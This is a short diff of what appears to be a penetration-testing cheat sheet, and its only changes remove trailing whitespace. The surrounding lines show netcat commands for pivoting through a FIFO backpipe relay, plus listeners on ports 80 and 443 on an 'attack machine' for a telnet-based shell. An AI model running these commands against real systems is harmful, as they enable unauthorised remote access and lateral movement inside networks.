@@ -1,4 +1,4 @@
-# To make a FIFO in the file system 
+# To make a FIFO in the file system
 mknod [name of file] p
 
 # Pivoting with a backpipe #
@@ -10,7 +10,7 @@ nc localhost 80 <[FIFO file name] | nc -l -p 4444 >[FIFO file name]
 
 # Telnet variant (when netcat is not available on the target) #
 # Listen on port 80 in terminal 1 on the attack machine
-nc -l -n -v -p 80 
+nc -l -n -v -p 80
 
 # Listen on port 443 in terminal 2 on the attack machine
 nc -l -n -v -p 443
